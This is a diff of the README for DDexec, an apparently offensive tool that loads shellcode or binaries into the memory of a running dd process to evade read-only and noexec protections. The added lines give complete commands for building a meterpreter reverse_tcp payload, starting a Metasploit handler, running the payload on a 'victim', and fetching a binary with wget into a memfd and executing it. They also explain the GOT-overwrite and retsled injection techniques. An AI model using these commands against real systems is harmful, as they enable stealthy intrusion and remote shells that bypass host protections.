@@ -1,9 +1,31 @@
 # DDexec
 
+This tool allows you to **load shellcodes and binaries in memory** abusing the dd binary (installed everywhere) from a regular sh/bash shell.
+
+This technique can very useful for **stealth purposes** but also to **bypass Read Only protections** in systems that might has applied that protection to make harder to pentesters to run binaries they want inside the system (because they cannot write them).
+
+*Note that in Read Only systems you usually might write inside /dev/shm, but that folder might be protected with noexec like in:*
+```bash
+echo 'apiVersion: v1
+kind: Pod
+metadata:
+  name: alpine-ro
+  namespace: default
+spec:
+  containers:
+  - name: alpine
+    image: alpine
+    command: ["/bin/sh"]
+    args: ["-c", "sleep 100000"]
+    securityContext:
+      readOnlyRootFilesystem: True' | kubectl apply -f-
+
+```
+
 ## Installation
 ```bash
 sudo apt-get update
-sudo apt-get install readelf objdump xclip -y # xclip is optional but recommended 
+sudo apt-get install readelf objdump -y
 sudo pip3 install ROPGadget
 ```
 
@@ -15,11 +37,12 @@ First of all you need to to **download some files from the victim system**:
 
 *Note that in the **STDOUT is only going to be printed the commands to execute in the victim machine**. Banner, information and logs are printed in STDERR.*
 
-Then execute `DDexec.sh` with `xclip` and the **clipboard will be populated** with the command line you need to run in the victim system.
+Then execute `DDexec.sh` with the command line you need to run in the victim system.
 ```bash
-bash DDexec.sh -l /tmp/victim/libc.so.6 -d /tmp/victim/dd -a x86_64 -H 127.0.0.1 -P 4444 -p linux/x64/meterpreter/reverse_tcp | xclip -selection clipboard
+bash DDexec.sh -o ./ddexec_payload.sh -l /tmp/victim/libc.so.6 -d /tmp/victim/dd -a x86_64 -H 127.0.0.1 -P 4444 -p linux/x64/meterpreter/reverse_tcp 
 ```
-**Paste the clipboard in the reverse-shell of the victim and the shellcode/binary will be run.**
+**Now you can either upload the resulting sh code to execute in the victim, or copy-paste it in the reverse-shell of the victim.**
+
 *To run a binary you need to use the argument `-b`. Please, read the **Binary Load** section to learn how*
 
 ## Help
@@ -27,6 +50,7 @@ bash DDexec.sh -l /tmp/victim/libc.so.6 -d /tmp/victim/dd -a x86_64 -H 127.0.0.1
 Use this program to execute shellcodes and binaries in memory.
 Arguments:
     -h Print this help
+    -o Path to the output file with the final payload to execute in the victim.
     -d Path to the victim dd binary (you should download it from the victim). Find it with 'command -v dd' Required.
     -l Path to the victim libc (you should download it from the victim). Find it with 'ldd `command -v dd` | grep libc | cut -d' ' -f3'. Required with mode "retsled".
     -H LHOST to receive the meterpreter
@@ -37,7 +61,7 @@ Arguments:
     -s Shellcode to execute in hex "4831c0b002...". If msfvenom params are given, msfvenom will create a shellcode. By default a shellcode that echoes "Pwnd!" is used.
     -b Binary to load in memory. It has to be either statically linked or use the same dynamic libs as on a target machine.
 
-e.g.: DDexec.sh -d /path/to/dd [-l /path/to/libc] -P 4444 -H 10.10.10.10 -a x86_64 [-m <fclose_got,retsled> (default fclose_got)] [-s <shellcode_hex>]
+e.g.: DDexec.sh -o /path/to/output/payload.sh -d /path/to/dd [-l /path/to/libc] -P 4444 -H 10.10.10.10 -a x86_64 [-m <fclose_got,retsled> (default fclose_got)] [-s <shellcode_hex>]
 ```
 
 ## Explanation
@@ -74,6 +98,19 @@ rsp            0x7fffffffeb88
 # Check that address of $rsp is inside the offset overwritten
 ```
 
+#### Example
+```bash
+# Prepare ddexec payload to attack localhost
+## To attack a different host you need to DOWNLOAD its DD and LIBC BINARIES
+bash DDexec.sh -o /tmp/ddexec_payload.sh -d $(command -v dd) -l $(ldd `command -v dd` | grep libc | cut -d" " -f3) -b $(printf "0x";(linux64 -R cat /proc/self/maps || setarch `arch` -R cat /proc/self/maps) | grep -E "libc|ld-musl" | head -n1 | cut -d'-' -f1) -H 127.0.0.1 -P 4444 -p linux/x64/meterpreter/reverse_tcp -m retsled
+
+# Listen with msfconsole
+msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; run'
+
+# Execute dd exec payload, you should get a meterpreter shell
+bash /tmp/ddexec_payload.sh
+```
+
 ### fclose GOT
 Based on the technique described in https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md this technique **writes the shellcode in the GOT** of the last function executed by `dd` before exiting: **`fclose`**. Therefore, when **`fclose` is executed, the shellcode will be executed instead**.
 
@@ -82,41 +119,60 @@ Based on the technique described in https://blog.sektor7.net/#!res/2018/pure-in-
 
 *Both techniques are possible because the **ASLR is disabled** when executing `dd` using `setarch`.*
 
-### Binary load
-This technique was taken from **https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.mdaslr**.
+#### Example
+```bash
+# Prepare ddexec payload to attack localhost
+## To attack a different host you need to DOWNLOAD its DD and LIBC BINARIES
+bash DDexec.sh -o /tmp/ddexec_payload.sh -d $(command -v dd) -l $(ldd `command -v dd` | grep libc | cut -d" " -f3) -b $(printf "0x";(linux64 -R cat /proc/self/maps || setarch `arch` -R cat /proc/self/maps) | grep -E "libc|ld-musl" | head -n1 | cut -d'-' -f1) -H 127.0.0.1 -P 4444 -p linux/x64/meterpreter/reverse_tcp
 
-In orer to **load a binary inside dd and execute it** the following steps are performed:
+# Listen with msfconsole
+msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; run'
+
+# Execute dd exec payload, you should get a meterpreter shell
+bash /tmp/ddexec_payload.sh
+```
+
+### Binary load via memfd
+This technique was taken from **https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.mdaslr and modified**.
+
+In order to **load a binary inside dd and execute it** the following steps are performed:
 - Use a shellcode which will create a memfd file in a memory. This is done using the system call *memfd_create()* which creates an anonymous file and returns a file descriptor that refers to it. The file **behaves like a regular file. However, it lives in RAM** and is automatically released when all references to it are dropped.
-- Inject the shellcode into a `dd` process (using one of the 2 previous techniques)
-- 'suspend' the dd process (also done by the shellcode). Then, the memfd won't be deleted as long as the `dd` process is running.
-- Write the binary to be executed inside the memfd file, and execute it.
+- Inject the shellcode into a `dd` process (using one of the 2 previous techniques).
+- Read the binary from stdin and write it to the memfd created by the shellcode.
+- 'suspend' the dd process (also done by the shellcode).
+- Access `cd /proc/$(pidof dd)/fd; ls` and execute the memfd file containing the binary (e.g.: `./5`)
 
 To perform this steps with `DDexec.sh` you need to **indicate with the `-b` argument the path to the binary** you want to load in memory:
 ```bash
-bash DDexec.sh -l /tmp/victim/libc.so.6 -d /tmp/victim/dd -a x86_64 -b /path/to/bin | xclip -selection clipboard
+bash DDexec.sh -o /tmp/ddexec_payload.sh -l /tmp/victim/libc.so.6 -d /tmp/victim/dd -a x86_64 -b <BaseAddress> -B /path/to/bin
 ```
-Then, **execute the new cmd line of the clipboard inside the target system**.
-This will generate a new `dd` process which will have created and **exposed a memfd file** and suspended its execution (so it doesn't die).
+Then, **upload and execute the ddexec payload generated**.
+This will generate a new `dd` process which will have created and **exposed a memfd file** and suspended its execution (so the dd process doesn't die).
 You can see the new memf file exposed running:
 ```bash
 ls -l /proc/$(pidof dd)/fd/
 total 0
-lrwx------ 1 kali kali 64 Dec 27 12:22 0 -> '/memfd:AAAA (deleted)'
-lrwx------ 1 kali kali 64 Dec 27 12:25 2 -> /dev/pts/4
+lr-x------    1 root     root            64 Feb 25 12:37 0 -> pipe:[111631]
+l-wx------    1 root     root            64 Feb 25 12:37 1 -> /proc/73/mem
+lr-x------    1 root     root            64 Feb 25 12:37 10 -> pipe:[111631]
+lrwx------    1 root     root            64 Feb 25 12:37 11 -> /dev/pts/2
+lrwx------    1 root     root            64 Feb 25 12:37 2 -> /dev/pts/2
+lr-x------    1 root     root            64 Feb 25 12:37 3 -> pipe:[111631]
+lrwx------    1 root     root            64 Feb 25 12:37 4 -> /dev/pts/2
+lrwx------    1 root     root            64 Feb 25 12:37 5 -> /memfd:DEAD (deleted)
 ```
-Notice how one of the file descriptors is **`memfd` aparently "deleted"**. Note how the fd is `0` (in this example).
+Notice how one of the file descriptors is **`memfd` aparently "deleted"**. Note that the fd is `5` (in this example).
 
-Then, to **load the binary in memory** you just need to **write it in this file**. For that purpose `DDexec.sh` will have echoed **a cmd line prepared to decode the base64 of the binary and write it in the file descriptor** (*change the fd index of the cmd line if necessary*).
+To execute the loaded binary just do: `/proc/$(pidof dd)/fd/5`
 
-Just execute that cmd line in the target system. It will look like this:
+If you want to reuse this memfd to **load another binary**, you just need to **write it in that file**. 
+
+For example, to load the `kubectl` binary you can do: 
 ```bash
-# Change the fd number if necesSary
-echo 'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAYGEAAAAAAABAAAAAAAAAAGg3AgAAAAAAAAAAAEAAOAALAEAAHgAdA...' | base64 -d > /proc/\$(pidof dd)/fd/0
+wget "https://dl.k8s.io/release/v1.23.4/bin/linux/amd64/kubectl" -O /proc/$(pidof dd)/fd/5
+/proc/$(pidof dd)/fd/5 # This will execute kubectl
 ```
 
-Once you have executed this cmd line, you will have **loaded the binary in memory in that memfd**. So you can just execute it as a normal binary:
-```bash
-# Doing this you will be executing the loaded binary
-## Change the fd number
-/proc/\$(pidof dd)/fd/<num>
-```
+### Full Binary Load
+
+Instead of using memfd files you could **completelly load the binary inside the DD proc memory**. You can find this completely awesome technique in **https://github.com/arget13/DDexec**
